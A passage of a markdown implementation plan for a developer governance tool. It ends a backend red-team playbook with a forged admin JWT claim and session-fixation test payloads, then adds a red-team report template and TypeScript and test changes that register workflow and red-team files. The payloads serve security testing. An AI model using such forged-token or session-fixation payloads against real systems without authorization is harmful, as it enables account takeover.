{"sub":"admin","role":"superadmin","exp":9999999999}

```

**Indicators of Vulnerability:**
- Token accepted with "none" algorithm
- Algorithm confusion succeeds
- Expired tokens still valid
- Modified claims accepted without re-verification

### ST-02: Session Fixation/Hijacking

**Description:** Attacker forces or steals session identifiers to take over user sessions.

**Check Procedure:**
1. Check if session ID changes after authentication
2. Test if session IDs are predictable
3. Check cookie security flags (HttpOnly, Secure, SameSite)
4. Test session invalidation on logout

**Example Payloads:**
```

# Session fixation — set session before login:

Cookie: session=attacker-controlled-value
POST /api/v1/login {"email":"victim@test.com","password":"correct"}

# Check if same session ID is used after login

# Session hijacking — check cookie flags:

# Missing HttpOnly → XSS can steal cookies

# Missing Secure → cookie sent over HTTP

# Missing SameSite → CSRF via cross-site requests

```

**Indicators of Vulnerability:**
- Session ID unchanged after authentication
- Predictable session ID patterns
- Missing security flags on session cookies
- Session persists after logout

---

## Severity Scoring Reference

| Severity | Score    | Criteria                                                        |
|----------|----------|-----------------------------------------------------------------|
| Critical | 9.0–10.0 | Remote code execution, full data breach, auth bypass with no privileges required |
| High     | 7.0–8.9  | Significant data exposure, privilege escalation, SSRF to internal services |
| Medium   | 4.0–6.9  | Limited data exposure, requires authentication, business logic flaws |
| Low      | 0.1–3.9  | Information disclosure, requires specific conditions, minimal impact |
| Info     | 0.0      | Best practice recommendations, no direct security impact |

## Report Generation

After completing both rounds, generate a report using `docs/reports/red-team-report-TEMPLATE.md`.

## Related

- **Skills**: [red-team-test](../../skills/red-team-test/SKILL.md), [security-review](../../skills/security-review/SKILL.md)
- **Commands**: [/red-team](../../commands/red-team.md), [/security-scan](../../commands/security-scan.md)
```

- [ ] **Step 2: Verify the file replaced the stub**

Run: `wc -l templates/generic/docs/security/backend-red-team-playbook.md`
Expected: ~280+ lines (was 3 lines before)

- [ ] **Step 3: Commit**

```bash
git add templates/generic/docs/security/backend-red-team-playbook.md
git commit -m "feat: replace red team playbook stub with full attack handbook (6 domains, 22 categories)"
```

---

## Task 14: Replace red-team-report-TEMPLATE.md stub with full content

**Files:**

- Replace: `templates/generic/docs/reports/red-team-report-TEMPLATE.md`

- [ ] **Step 1: Replace the 3-line stub with the full report template**

Overwrite `templates/generic/docs/reports/red-team-report-TEMPLATE.md` with:

```markdown
# Red Team Report

**Project:** <!-- AI-FILL: project name -->
**Date:** <!-- AI-FILL: YYYY-MM-DD -->
**Tester:** <!-- AI-FILL: agent or human name -->
**Workflow ID:** <!-- AI-FILL: workflow_id if part of a workflow -->

---

## Executive Summary

**Verdict:** <!-- AI-FILL: PASS | CONDITIONAL | BLOCK -->

| Severity | Count            | Status                               |
| -------- | ---------------- | ------------------------------------ |
| Critical | <!-- AI-FILL --> | <!-- AI-FILL: all fixed / N open --> |
| High     | <!-- AI-FILL --> | <!-- AI-FILL -->                     |
| Medium   | <!-- AI-FILL --> | <!-- AI-FILL -->                     |
| Low      | <!-- AI-FILL --> | <!-- AI-FILL -->                     |
| Info     | <!-- AI-FILL --> | <!-- AI-FILL -->                     |

**Total Findings:** <!-- AI-FILL -->
**Endpoints Tested:** <!-- AI-FILL -->
**Attack Categories Tested:** <!-- AI-FILL: N/22 -->

---

## Round 1: Systematic Sweep

**Duration:** <!-- AI-FILL: Xm Ys -->
**Endpoints Checked:** <!-- AI-FILL -->
**Categories Checked:** <!-- AI-FILL: N/22 -->

### Findings Matrix

| Endpoint                        | AA                                   | IV  | BL  | RC  | DS  | ST  |
| ------------------------------- | ------------------------------------ | --- | --- | --- | --- | --- |
| <!-- AI-FILL: endpoint path --> | <!-- AI-FILL: finding count or ✓ --> |     |     |     |     |     |

### Round 1 Findings

#### Finding R1-001: <!-- AI-FILL: title -->

- **ID:** <!-- AI-FILL: e.g., R1-001 -->
- **Attack ID:** <!-- AI-FILL: e.g., AA-01 -->
- **Domain:** <!-- AI-FILL: e.g., Authentication & Authorization -->
- **Endpoint:** <!-- AI-FILL: e.g., GET /api/v1/orders/:id -->
- **Severity:** <!-- AI-FILL: Critical/High/Medium/Low/Info -->
- **Score:** <!-- AI-FILL: 0.0-10.0 -->
- **Description:** <!-- AI-FILL: what was found -->
- **Reproduction Steps:**
  1. <!-- AI-FILL -->
  2. <!-- AI-FILL -->
- **Evidence:** <!-- AI-FILL: request/response snippets -->
- **Remediation:** <!-- AI-FILL: recommended fix -->
- **Status:** <!-- AI-FILL: open/fixed/mitigated/accepted -->

<!-- Repeat for each finding -->

---

## Round 2: Adversarial Creative Attack

**Duration:** <!-- AI-FILL: Xm Ys -->
**Attack Chains Explored:** <!-- AI-FILL -->

### Attack Chain C-001: <!-- AI-FILL: title -->

- **Chain ID:** C-001
- **Preconditions:** <!-- AI-FILL: required state/access -->
- **Steps:**
  1. <!-- AI-FILL: first attack step -->
  2. <!-- AI-FILL: second attack step -->
  3. <!-- AI-FILL: third attack step -->
- **Impact:** <!-- AI-FILL: what the attacker achieves -->
- **Severity:** <!-- AI-FILL -->
- **Score:** <!-- AI-FILL -->
- **Mitigation:** <!-- AI-FILL: how to prevent the chain -->
- **Status:** <!-- AI-FILL: open/fixed/mitigated -->

<!-- Repeat for each chain -->

### Additional Round 2 Findings

#### Finding R2-001: <!-- AI-FILL: title -->

- **Attack ID:** <!-- AI-FILL -->
- **Type:** <!-- AI-FILL: timing/boundary/creative -->
- **Description:** <!-- AI-FILL -->
- **Severity:** <!-- AI-FILL -->
- **Score:** <!-- AI-FILL -->
- **Status:** <!-- AI-FILL -->

<!-- Repeat for each finding -->

---

## Remediation Summary

| Priority | Finding ID       | Title            | Severity | Remediation      | Status           |
| -------- | ---------------- | ---------------- | -------- | ---------------- | ---------------- |
| 1        | <!-- AI-FILL --> | <!-- AI-FILL --> | Critical | <!-- AI-FILL --> | <!-- AI-FILL --> |
| 2        | <!-- AI-FILL --> | <!-- AI-FILL --> | High     | <!-- AI-FILL --> | <!-- AI-FILL --> |

---

## Risk Acceptance

<!-- For CONDITIONAL verdict only — document accepted risks -->

| Finding ID       | Title            | Severity         | Justification    | Accepted By      | Date             |
| ---------------- | ---------------- | ---------------- | ---------------- | ---------------- | ---------------- |
| <!-- AI-FILL --> | <!-- AI-FILL --> | <!-- AI-FILL --> | <!-- AI-FILL --> | <!-- AI-FILL --> | <!-- AI-FILL --> |

---

## Appendix

### Endpoint Inventory

| Method           | Path             | Auth Required    | Description      |
| ---------------- | ---------------- | ---------------- | ---------------- |
| <!-- AI-FILL --> | <!-- AI-FILL --> | <!-- AI-FILL --> | <!-- AI-FILL --> |

### SQLite Records

- Round 1 ID: <!-- AI-FILL -->
- Round 2 ID: <!-- AI-FILL -->
- Total findings recorded: <!-- AI-FILL -->
- Total chains recorded: <!-- AI-FILL -->
- Query: `SELECT * FROM red_team_rounds WHERE workflow_id = '<workflow_id>'`
```

- [ ] **Step 2: Verify the file replaced the stub**

Run: `wc -l templates/generic/docs/reports/red-team-report-TEMPLATE.md`
Expected: ~100 lines (was 3 lines before)

- [ ] **Step 3: Commit**

```bash
git add templates/generic/docs/reports/red-team-report-TEMPLATE.md
git commit -m "feat: replace red team report template stub with full structured template"
```

---

## Task 15: Register workflow assets in governance manifest

**Files:**

- Modify: `src/templates/governance.ts`

This task registers the workflow orchestration files (always deployed) in the governance manifest:

- 1 skill: `workflow-orchestration`
- 3 commands: `workflow-start`, `workflow-resume`, `workflow-status`
- 1 SQL file: `workflow-schema.sql`
- 1 JSON schema: `workflows/schema.json`
- 5 preset files: `workflows/presets/*.yaml`

- [ ] **Step 1: Write failing test for new workflow governance counts**

Open `tests/unit/templates/governance.test.ts` and update count assertions using **incremental deltas** from current values in the file (do not assume fixed baselines from earlier phases).

Count increments introduced by this task:

- Skills: **+1** (`workflow-orchestration`)
- Commands: **+3** (`workflow-start`, `workflow-resume`, `workflow-status`)
- Workflow files section: **+7** (1 SQL + 1 JSON schema + 5 YAML presets)

Total increment for each affected scenario: **+11**.

Edit `tests/unit/templates/governance.test.ts`:

In the first test ("generates core governance files for minimal config"), change:

```typescript
// Core + operations skills: 21 + 18 = 39
const skillTasks = tasks.filter((t) => t.destination.startsWith("skills/"));
expect(skillTasks).toHaveLength(39);
```

to:

```typescript
// Core + operations skills: 22 + 18 = 40
const skillTasks = tasks.filter((t) => t.destination.startsWith("skills/"));
expect(skillTasks).toHaveLength(40);
expect(skillTasks.map((t) => t.destination)).toContain("skills/workflow-orchestration/SKILL.md");
```

Change:

```typescript
// Core commands: 24
const commandTasks = tasks.filter((t) => t.destination.startsWith("commands/"));
expect(commandTasks).toHaveLength(24);
```

to:

```typescript
// Core commands: 27
const commandTasks = tasks.filter((t) => t.destination.startsWith("commands/"));
expect(commandTasks).toHaveLength(27);
expect(commandTasks.map((t) => t.destination)).toContain("commands/workflow-start.md");
expect(commandTasks.map((t) => t.destination)).toContain("commands/workflow-resume.md");
expect(commandTasks.map((t) => t.destination)).toContain("commands/workflow-status.md");
```

Add a new section after MCP configs check:

```typescript
// Workflow files: 1 SQL + 1 schema + 5 presets = 7
const workflowTasks = tasks.filter(
  (t) => t.destination.startsWith("workflows/") || t.destination === ".bbg/scripts/workflow-schema.sql",
);
expect(workflowTasks).toHaveLength(7);
```

Change the total by incrementing the current value by **+11**.

Example: if current core total is `108`, set it to `119`.

Update the TypeScript test total by incrementing the current value by **+11**.

Example: if current TypeScript total is `122`, set it to `133`.

Update the multi-language test total by incrementing the current value by **+11**.

Example: if current TS+Python total is `135`, set it to `146`.

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/unit/templates/governance.test.ts`
Expected: FAIL — counts don't match yet

- [ ] **Step 3: Add workflow-orchestration to CORE_SKILLS in governance.ts**

In `src/templates/governance.ts`, add `"workflow-orchestration"` to the end of the `CORE_SKILLS` array (after `"mcp-integration"`):

Change:

```typescript
const CORE_SKILLS = [
  "coding-standards",
  "tdd-workflow",
  "security-review",
  "verification-loop",
  "search-first",
  "writing-plans",
  "continuous-learning",
  "eval-harness",
  "strategic-compact",
  "api-design",
  "backend-patterns",
  "database-migrations",
  "postgres-patterns",
  "frontend-patterns",
  "e2e-testing",
  "deployment-patterns",
  "docker-patterns",
  "kubernetes-patterns",
  "harness-engineering",
  "autonomous-loops",
  "mcp-integration",
];
```

to:

```typescript
const CORE_SKILLS = [
  "coding-standards",
  "tdd-workflow",
  "security-review",
  "verification-loop",
  "search-first",
  "writing-plans",
  "continuous-learning",
  "eval-harness",
  "strategic-compact",
  "api-design",
  "backend-patterns",
  "database-migrations",
  "postgres-patterns",
  "frontend-patterns",
  "e2e-testing",
  "deployment-patterns",
  "docker-patterns",
  "kubernetes-patterns",
  "harness-engineering",
  "autonomous-loops",
  "mcp-integration",
  "workflow-orchestration",
];
```

- [ ] **Step 4: Add workflow commands to CORE_COMMANDS**

In `src/templates/governance.ts`, add 3 commands to the end of `CORE_COMMANDS` (after `"sync"`):

Change:

```typescript
const CORE_COMMANDS = [
  "plan",
  "tdd",
  "code-review",
  "build-fix",
  "security-scan",
  "refactor-clean",
  "e2e",
  "test-coverage",
  "update-docs",
  "doctor",
  "learn",
  "learn-eval",
  "checkpoint",
  "verify",
  "sessions",
  "eval",
  "orchestrate",
  "loop-start",
  "loop-status",
  "quality-gate",
  "harness-audit",
  "model-route",
  "setup-pm",
  "sync",
];
```

to:

```typescript
const CORE_COMMANDS = [
  "plan",
  "tdd",
  "code-review",
  "build-fix",
  "security-scan",
  "refactor-clean",
  "e2e",
  "test-coverage",
  "update-docs",
  "doctor",
  "learn",
  "learn-eval",
  "checkpoint",
  "verify",
  "sessions",
  "eval",
  "orchestrate",
  "loop-start",
  "loop-status",
  "quality-gate",
  "harness-audit",
  "model-route",
  "setup-pm",
  "sync",
  "workflow-start",
  "workflow-resume",
  "workflow-status",
];
```

- [ ] **Step 5: Add WORKFLOW_FILES constant and deployment logic**

Add the following after the `MCP_CONFIG_FILES` constant (around line 176) in `src/templates/governance.ts`:

```typescript
const WORKFLOW_FILES = {
  scripts: ["workflow-schema.sql"],
  schema: ["schema.json"],
  presets: ["tdd-feature.yaml", "bugfix.yaml", "security-audit.yaml", "release-prep.yaml", "full-feature.yaml"],
};
```

Then in the `buildGovernanceManifest` function, add the following section after the MCP Configs section (after the `// --- MCP Configs ---` block, around line 293):

```typescript
// --- Workflow Files ---
for (const script of WORKFLOW_FILES.scripts) {
  tasks.push(copyTask(`generic/.bbg/scripts/${script}`, `.bbg/scripts/${script}`));
}
for (const schema of WORKFLOW_FILES.schema) {
  tasks.push(copyTask(`generic/workflows/${schema}`, `workflows/${schema}`));
}
for (const preset of WORKFLOW_FILES.presets) {
  tasks.push(copyTask(`generic/workflows/presets/${preset}`, `workflows/presets/${preset}`));
}
```

Also add `workflowFiles` to the exported `GOVERNANCE_MANIFEST` constant:

Change:

```typescript
export const GOVERNANCE_MANIFEST = {
  coreAgents: CORE_AGENTS,
  languageAgents: LANGUAGE_AGENTS,
  coreSkills: CORE_SKILLS,
  operationsSkills: OPERATIONS_SKILLS,
  languageSkills: LANGUAGE_SKILLS,
  commonRules: COMMON_RULES,
  languageRules: LANGUAGE_RULES,
  coreCommands: CORE_COMMANDS,
  languageCommands: LANGUAGE_COMMANDS,
  hookFiles: HOOK_FILES,
  contextHbsFiles: CONTEXT_HBS_FILES,
  mcpConfigFiles: MCP_CONFIG_FILES,
} as const;
```

to:

```typescript
export const GOVERNANCE_MANIFEST = {
  coreAgents: CORE_AGENTS,
  languageAgents: LANGUAGE_AGENTS,
  coreSkills: CORE_SKILLS,
  operationsSkills: OPERATIONS_SKILLS,
  languageSkills: LANGUAGE_SKILLS,
  commonRules: COMMON_RULES,
  languageRules: LANGUAGE_RULES,
  coreCommands: CORE_COMMANDS,
  languageCommands: LANGUAGE_COMMANDS,
  hookFiles: HOOK_FILES,
  contextHbsFiles: CONTEXT_HBS_FILES,
  mcpConfigFiles: MCP_CONFIG_FILES,
  workflowFiles: WORKFLOW_FILES,
} as const;
```

- [ ] **Step 6: Run test to verify it passes**

Run: `npx vitest run tests/unit/templates/governance.test.ts`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add src/templates/governance.ts tests/unit/templates/governance.test.ts
git commit -m "feat: register workflow orchestration assets in governance manifest"
```

---

## Task 16: Register red team assets with backend conditional logic

**Files:**

- Modify: `src/templates/governance.ts`
- Modify: `src/commands/init-manifest.ts`
- Modify: `tests/unit/templates/governance.test.ts`

This task:

1. Adds `isBackendProject()` helper to governance.ts
2. Creates a `BACKEND_GOVERNANCE` section for conditional red team files
3. Moves the playbook and report template from `ROOT_TEMPLATE_MANIFEST` to the conditional section
4. Updates tests to verify conditional generation

- [ ] **Step 1: Write failing test for backend conditional generation**

Add a new test to `tests/unit/templates/governance.test.ts`:

```typescript
it("includes red team governance files for backend Java project", () => {
  const config = createMinimalConfig({
    repos: [
      makeRepo({
        name: "api",
        gitUrl: "https://github.com/test/api.git",
        type: "backend",
        description: "java api",
        stack: {
          language: "java",
          framework: "spring",
          buildTool: "gradle",
          testFramework: "junit",
          packageManager: "gradle",
        },
      }),
    ],
  });
  const ctx = buildTemplateContext(config);
  const tasks = buildGovernanceManifest(ctx);

  const destinations = tasks.map((t) => t.destination);

  // Red team skill
  expect(destinations).toContain("skills/red-team-test/SKILL.md");
  // Red team command
  expect(destinations).toContain("commands/red-team.md");
  // Red team SQL
  expect(destinations).toContain(".bbg/scripts/red-team-schema.sql");
  // Red team docs (moved from ROOT_TEMPLATE_MANIFEST to conditional governance)
  expect(destinations).toContain("docs/security/backend-red-team-playbook.md");
  expect(destinations).toContain("docs/reports/red-team-report-TEMPLATE.md");
});

it("excludes red team governance files for frontend-only project", () => {
  const config = createMinimalConfig({
    repos: [makeRepo()], // default is typescript frontend-web
  });
  const ctx = buildTemplateContext(config);
  const tasks = buildGovernanceManifest(ctx);

  const destinations = tasks.map((t) => t.destination);

  // Red team files should NOT be present
  expect(destinations).not.toContain("skills/red-team-test/SKILL.md");
  expect(destinations).not.toContain("commands/red-team.md");
  expect(destinations).not.toContain(".bbg/scripts/red-team-schema.sql");
  expect(destinations).not.toContain("docs/security/backend-red-team-playbook.md");
  expect(destinations).not.toContain("docs/reports/red-team-report-TEMPLATE.md");
});

it("includes red team files for Python FastAPI backend", () => {
  const config = createMinimalConfig({
    repos: [
      makeRepo({
        name: "api",
        gitUrl: "https://github.com/test/api.git",
        type: "backend",
        description: "python api",
        stack: {
          language: "python",
          framework: "fastapi",
          buildTool: "pip",
          testFramework: "pytest",
          packageManager: "pip",
        },
      }),
    ],
  });
  const ctx = buildTemplateContext(config);
  const tasks = buildGovernanceManifest(ctx);

  const destinations = tasks.map((t) => t.destination);
  expect(destinations).toContain("skills/red-team-test/SKILL.md");
  expect(destinations).toContain("commands/red-team.md");
});

it("excludes red team files for Python non-web project", () => {
  const config = createMinimalConfig({
    repos: [
      makeRepo({
        name: "ml",
        gitUrl: "https://github.com/test/ml.git",
        type: "other",
        description: "ml pipeline",
        stack: {
          language: "python",
          framework: "pytorch",
          buildTool: "pip",
          testFramework: "pytest",
          packageManager: "pip",
        },
      }),
    ],
  });
  const ctx = buildTemplateContext(config);
  const tasks = buildGovernanceManifest(ctx);

  const destinations = tasks.map((t) => t.destination);
  expect(destinations).not.toContain("skills/red-team-test/SKILL.md");
  expect(destinations).not.toContain("commands/red-team.md");
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/unit/templates/governance.test.ts`
Expected: FAIL — red team files not conditionally generated yet

- [ ] **Step 3: Add isBackendProject helper and BACKEND_GOVERNANCE to governance.ts**

Add the following constants after `WORKFLOW_FILES` in `src/templates/governance.ts`:

```typescript
const BACKEND_WEB_FRAMEWORKS = new Set([
  "django",
  "fastapi",
  "flask",
  "spring",
  "springboot",
  "spring-boot",
  "quarkus",
  "micronaut",
  "gin",
  "echo",
  "fiber",
  "axum",
  "actix-web",
  "actix",
  "rocket",
  "ktor",
]);

const BACKEND_GOVERNANCE = {
  skills: ["red-team-test"],
  commands: ["red-team"],
  scripts: ["red-team-schema.sql"],
  docs: [
    {
      source: "generic/docs/security/backend-red-team-playbook.md",
      destination: "docs/security/backend-red-team-playbook.md",
    },
    {
      source: "generic/docs/reports/red-team-report-TEMPLATE.md",
      destination: "docs/reports/red-team-report-TEMPLATE.md",
    },
  ],
};
```

Add the `isBackendProject` function after `detectLanguages`:

```typescript
function isBackendProject(ctx: TemplateContext): boolean {
  // Java, Go, Rust are always backend-capable
  if (ctx.hasJava || ctx.hasGo || ctx.hasRust) return true;

  // Python only counts if it has a web framework
  if (ctx.hasPython) {
    const lowerFrameworks = ctx.frameworks.map((f) => f.toLowerCase());
    return lowerFrameworks.some((f) => BACKEND_WEB_FRAMEWORKS.has(f));
  }

  return false;
}
```

Then add a backend governance section in `buildGovernanceManifest`, after the Workflow Files section:

```typescript
// --- Backend-only: Red Team Governance ---
if (isBackendProject(ctx)) {
  for (const skill of BACKEND_GOVERNANCE.skills) {
    tasks.push(copyTask(`skills/${skill}/SKILL.md`, `skills/${skill}/SKILL.md`));
  }
  for (const cmd of BACKEND_GOVERNANCE.commands) {
    tasks.push(copyTask(`commands/${cmd}.md`, `commands/${cmd}.md`));
  }
  for (const script of BACKEND_GOVERNANCE.scripts) {
    tasks.push(copyTask(`generic/.bbg/scripts/${script}`, `.bbg/scripts/${script}`));
  }
  for (const doc of BACKEND_GOVERNANCE.docs) {
    tasks.push(copyTask(doc.source, doc.destination));
  }
}
```

Also add `backendGovernance` to the exported `GOVERNANCE_MANIFEST`:

```typescript
export const GOVERNANCE_MANIFEST = {
  coreAgents: CORE_AGENTS,
  languageAgents: LANGUAGE_AGENTS,
  coreSkills: CORE_SKILLS,
  operationsSkills: OPERATIONS_SKILLS,
  languageSkills: LANGUAGE_SKILLS,
  commonRules: COMMON_RULES,
  languageRules: LANGUAGE_RULES,
  coreCommands: CORE_COMMANDS,
  languageCommands: LANGUAGE_COMMANDS,
  hookFiles: HOOK_FILES,
  contextHbsFiles: CONTEXT_HBS_FILES,
  mcpConfigFiles: MCP_CONFIG_FILES,
  workflowFiles: WORKFLOW_FILES,
  backendGovernance: BACKEND_GOVERNANCE,
} as const;
```

- [ ] **Step 4: Remove playbook and report template from ROOT_TEMPLATE_MANIFEST**

In `src/commands/init-manifest.ts`, remove these two entries from `ROOT_TEMPLATE_MANIFEST`:

Remove:

```typescript
  {
    source: "generic/docs/security/backend-red-team-playbook.md",
    destination: "docs/security/backend-red-team-playbook.md",
    mode: "copy",
  },
```

and:

```typescript
  {
    source: "generic/docs/reports/red-team-report-TEMPLATE.md",
    destination: "docs/reports/red-team-report-TEMPLATE.md",
    mode: "copy",
  },
```

These are now conditionally deployed via the governance manifest's `BACKEND_GOVERNANCE` section.

- [ ] **Step 5: Update total counts in existing governance tests**

The removal of 2 items from `ROOT_TEMPLATE_MANIFEST` does NOT affect the governance.test.ts counts because `ROOT_TEMPLATE_MANIFEST` is tested separately (in other test files). The governance manifest counts only cover what `buildGovernanceManifest` returns.

For a backend Java project, compute totals from the **current** baseline:

- Core: use current core total after Task 15 updates (do not assume a fixed number)
- Java-specific increment: 2 agents + 4 skills + 4 rules + 3 commands = **+13**
- Backend governance increment: 1 skill + 1 command + 1 SQL + 2 docs = **+5**
- Total backend Java = `currentCoreAfterTask15 + 13 + 5`

Update the Java backend test to verify the total:

```typescript
it("includes red team governance files for backend Java project", () => {
  // ... (test from Step 1 above)
  expect(tasks).toHaveLength(/* core-after-Task-15 + 18 */);
  // Total = core-after-Task-15 + 13 (Java language files) + 5 (backend governance)
  // Set the assertion number to the concrete computed value for your current baseline.
});
```

- [ ] **Step 6: Run test to verify it passes**

Run: `npx vitest run tests/unit/templates/governance.test.ts`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add src/templates/governance.ts src/commands/init-manifest.ts tests/unit/templates/governance.test.ts
git commit -m "feat: add conditional backend red team governance with isBackendProject helper"
```

---

## Task 17: Update self-checks to include new manifest entries

**Files:**

- Modify: `src/doctor/self-checks.ts`

The `checkNoOrphanFiles` function in `src/doctor/self-checks.ts` uses `GOVERNANCE_MANIFEST` to build a set of known paths. We need to add the new workflow files and backend governance files so they aren't flagged as orphans.

- [ ] **Step 1: Update checkNoOrphanFiles to include workflowFiles and backendGovernance**

In `src/doctor/self-checks.ts`, inside the `checkNoOrphanFiles` function, add after the existing command manifest path additions (around line 122):

```typescript
// Workflow files
for (const script of GOVERNANCE_MANIFEST.workflowFiles.scripts) {
  allManifestPaths.add(`.bbg/scripts/${script}`);
}
for (const schema of GOVERNANCE_MANIFEST.workflowFiles.schema) {
  allManifestPaths.add(`workflows/${schema}`);
}
for (const preset of GOVERNANCE_MANIFEST.workflowFiles.presets) {
  allManifestPaths.add(`workflows/presets/${preset}`);
}

// Backend governance files
for (const skill of GOVERNANCE_MANIFEST.backendGovernance.skills) {
  allManifestPaths.add(`skills/${skill}/SKILL.md`);
}
for (const cmd of GOVERNANCE_MANIFEST.backendGovernance.commands) {
  allManifestPaths.add(`commands/${cmd}.md`);
}
```

Note: The docs and scripts in `backendGovernance` are template files (in `templates/generic/`), not top-level governance files, so they won't be flagged by the orphan scanner (which only looks in `agents/`, `skills/`, `rules/`, `commands/`).

- [ ] **Step 2: Verify build compiles**

Run: `npx tsc --noEmit`
Expected: No errors

- [ ] **Step 3: Commit**

```bash
git add src/doctor/self-checks.ts
git commit -m "feat: update self-checks to recognize workflow and red team manifest entries"
```

---

## Task 18: Update governance cross-reference test minimum

**Files:**

- Modify: `tests/unit/templates/governance.crossref.test.ts`

The cross-reference test has a minimum file count check. We added 2 new skills, 4 new commands, so the minimum should increase.

- [ ] **Step 1: Update the minimum governance file count**

In `tests/unit/templates/governance.crossref.test.ts`, change:

```typescript
it("finds governance files to validate", () => {
  expect(files.length).toBeGreaterThanOrEqual(150);
});
```

to:

```typescript
it("finds governance files to validate", () => {
  expect(files.length).toBeGreaterThanOrEqual(156);
});
```

(Added: 2 skills + 4 commands = 6 new governance markdown files)

- [ ] **Step 2: Run cross-reference test**

Run: `npx vitest run tests/unit/templates/governance.crossref.test.ts`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add tests/unit/templates/governance.crossref.test.ts
git commit -m "test: update governance cross-reference minimum file count for Phase 6"
```

---

## Task 19: Full build and test verification

**Files:** None (verification only)

- [ ] **Step 1: Run TypeScript type checking**

Run: `npx tsc --noEmit`
Expected: No errors

- [ ] **Step 2: Run all unit tests**

Run: `npx vitest run`
Expected: All tests pass

- [ ] **Step 3: Run build**

Run: `npm run build`
Expected: Build succeeds

- [ ] **Step 4: Run lint**

Run: `npm run lint`
Expected: No errors (or only pre-existing warnings)

- [ ] **Step 5: Final commit if any fixups needed**

If any tests or lint issues needed fixing in previous steps, commit the fixes:

```bash
git add -A
git commit -m "fix: address Phase 6 lint/type/test issues"
```

---

## Summary

| Task | Description                                | Files     | Type         |
| ---- | ------------------------------------------ | --------- | ------------ |
| 1    | Workflow SQL schema                        | 1 create  | Content      |
| 2    | Workflow JSON schema                       | 1 create  | Content      |
| 3    | tdd-feature preset                         | 1 create  | Content      |
| 4    | bugfix preset                              | 1 create  | Content      |
| 5    | security-audit preset                      | 1 create  | Content      |
| 6    | release-prep preset                        | 1 create  | Content      |
| 7    | full-feature preset                        | 1 create  | Content      |
| 8    | Workflow orchestration skill               | 1 create  | Content      |
| 9    | 3 workflow commands                        | 3 create  | Content      |
| 10   | Red team SQL schema                        | 1 create  | Content      |
| 11   | Red team testing skill                     | 1 create  | Content      |
| 12   | Red team command                           | 1 create  | Content      |
| 13   | Red team playbook (replace stub)           | 1 replace | Content      |
| 14   | Red team report template (replace stub)    | 1 replace | Content      |
| 15   | Register workflow assets                   | 2 modify  | Code         |
| 16   | Register red team with backend conditional | 3 modify  | Code         |
| 17   | Update self-checks                         | 1 modify  | Code         |
| 18   | Update cross-reference test                | 1 modify  | Test         |
| 19   | Full verification                          | 0         | Verification |

**Total new files:** 16
**Total modified files:** 7
**Total tasks:** 19
**Estimated total steps:** ~55
